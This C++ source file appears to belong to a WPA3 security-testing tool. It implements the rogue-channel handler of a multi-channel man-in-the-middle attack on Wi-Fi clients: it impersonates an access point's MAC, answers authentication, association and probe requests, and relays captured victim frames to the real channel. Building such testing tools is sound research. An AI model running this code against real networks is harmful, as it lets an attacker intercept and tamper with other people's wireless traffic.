#include "attacks/mc_mitm/mc_mitm.h"

#include <chrono>
#include <tins/tins.h>
#include "attacks/by_target/scan_AP.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "system/hw_capabilities.h"

namespace wpa3_tester{
using namespace std;
using namespace chrono;
using namespace Tins;

bool McMitm::handle_open_auth(const HWAddress<6> &addr2, Dot11 &dot11) const{
    if(const auto *auth = dot11.find_pdu<Dot11Authentication>()){
        if(auth->auth_algorithm() == 0 && auth->auth_seq_number() == 1){
            // Open System Auth seq=1 →  seq=2 success
            Dot11Authentication resp;
            resp.addr1(addr2);        // client
            resp.addr2(ap_mac);       // rogue AP
            resp.addr3(ap_mac);
            resp.auth_seq_number(2);
            resp.auth_algorithm(0);   // Open System
            resp.status_code(0);      // Success
            sock_rogue->send(resp, netconfig.rogue_channel);
            log(LogLevel::DEBUG, "Rogue channel: sent Open Auth response to {}", addr2.to_string());
            return true;
        }
    }
    return false;
}

bool McMitm::handle_assoc_request(const HWAddress<6> &addr2, PDU &pdu, Dot11 &dot11) const{
    if(const auto *assoc = dot11.find_pdu<Dot11AssocRequest>()){
        Dot11AssocResponse resp;
        resp.addr1(addr2);  // target sta
        resp.addr2(ap_mac); // rogue AP
        resp.addr3(ap_mac);
        resp.status_code(0); //success
        resp.capabilities() = assoc->capabilities();
        resp.aid(1);

        // Supported Rates IE
        const Dot11ManagementFrame::rates_type rates = {
            static_cast<Dot11ManagementFrame::rates_type::value_type>(82),  // 1 Mbps (basic)
            static_cast<Dot11ManagementFrame::rates_type::value_type>(84),  // 2 Mbps (basic)
            static_cast<Dot11ManagementFrame::rates_type::value_type>(139), // 5.5 Mbps (basic)
            static_cast<Dot11ManagementFrame::rates_type::value_type>(150), // 11 Mbps
            static_cast<Dot11ManagementFrame::rates_type::value_type>(36),  // 18 Mbps
            static_cast<Dot11ManagementFrame::rates_type::value_type>(48),  // 24 Mbps
            static_cast<Dot11ManagementFrame::rates_type::value_type>(72),  // 36 Mbps
            static_cast<Dot11ManagementFrame::rates_type::value_type>(96),  // 48 Mbps
        };
        resp.supported_rates(rates);
        sock_rogue->send(resp, netconfig.rogue_channel);
        log(LogLevel::DEBUG, "Rogue channel: sent Assoc response to {}", addr2.to_string());
        sock_real->send(pdu, netconfig.real_channel);
        return true;
    }
    return false;
}

bool McMitm::handle_probe_request(const HWAddress<6> addr2, const PDU *pdu, const Dot11 &dot11) const{
    if(dot11.find_pdu<Dot11ProbeRequest>()){
        if(ap_mac != dot11.addr1()) return true;
        probe_resp->addr1(addr2);
        sock_rogue->send(*probe_resp, netconfig.rogue_channel);
        display_client_traffic(*pdu, "Rogue channel", " -- Replied");
        return true;
    }
    return false;
}

void McMitm::handle_rx_rogue_chan(const unique_ptr<PDU> &pdu){
    auto *dot11 = pdu->find_pdu<Dot11>();
    if(!dot11) return;

    HWAddress<6> addr2; // transmitter
    if(const auto *mgmt = pdu->find_pdu<Dot11ManagementFrame>()){
        addr2 = mgmt->addr2().to_string();
    } else if(const auto *data = pdu->find_pdu<Dot11Data>()){
        addr2 = data->addr2().to_string();
    }/*else{
        if(dot11->type() != Dot11::CONTROL) log(LogLevel::DEBUG, "Unknown frame type");
        return;
    }*/

    //FIXME
    if(handle_open_auth(addr2, *dot11)) return;
    if(handle_assoc_request(addr2, *pdu, *dot11)) return;;
    if(handle_probe_request(addr2, pdu.get(), *dot11)) return;;

    if(addr2 == ap_mac){ //transmitter
        if(const auto *b = dot11->find_pdu<Dot11Beacon>()){
            const auto *ch_ie = b->search_option(Dot11ManagementFrame::DS_SET);
            if(ch_ie && ch_ie->data_size() >= 1 && ch_ie->data_ptr()[0] == netconfig.rogue_channel)
                last_rogue_beacon = steady_clock::now();
        }
        if(dot11->addr1() == client_mac || clients.contains(dot11->addr1().to_string())){
            display_client_traffic(*pdu, "Rogue channel");
        }
    } else if(dot11->find_pdu<Dot11ProbeRequest>()){
        probe_resp->addr1(addr2);
        sock_rogue->send(*probe_resp, netconfig.rogue_channel);
        display_client_traffic(*pdu, "Rogue channel", " -- Replied");
    } else if(dot11->addr1() == ap_mac){
        ClientState *client = nullptr;
        bool will_forward = false;
        if(clients.contains(addr2.to_string())){
            client = clients.at(addr2.to_string()).get();
            will_forward = client->should_forward(*pdu);
            if(dot11->find_pdu<Dot11Authentication>() ||
                dot11->find_pdu<Dot11AssocRequest>() ||
                client->state <= ClientState::Connecting){
                print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
                client->mark_got_mitm();
            } else{
                display_client_traffic(*pdu, "Rogue channel", " -- MitM'ing");
            }
        } else if(
            // auth/assoc what rogue AP cant generate
            dot11->find_pdu<Dot11Authentication>() ||
            dot11->find_pdu<Dot11AssocRequest>() ||
            dot11->type() == Dot11::DATA){

            print_rx(LogLevel::INFO, "Rogue channel", *dot11, " -- MitM'ing");
            auto new_client = ClientState(addr2.to_string());
            new_client.mark_got_mitm();
            add_client(new_client);
            client = clients.at(addr2.to_string()).get();
            will_forward = true;
        } else if(addr2 == client_mac){
            display_client_traffic(*pdu, "Rogue channel");
        }

        // sleep detection
        if(client != nullptr && will_forward){
            if( power_mgmt(*dot11) && clients.contains(addr2.to_string()) &&
                clients.at(addr2.to_string())->state < ClientState::Attack_Done){
                log(LogLevel::WARNING, "Client {} is going to sleep on rogue channel. Removing sleep bit.", addr2.to_string());
            }
            sock_real->send(*pdu, netconfig.real_channel);
        }
    } else if(dot11->addr1() == client_mac || addr2 == client_mac){
        display_client_traffic(*pdu, "Rogue channel", "_");
    }
}

}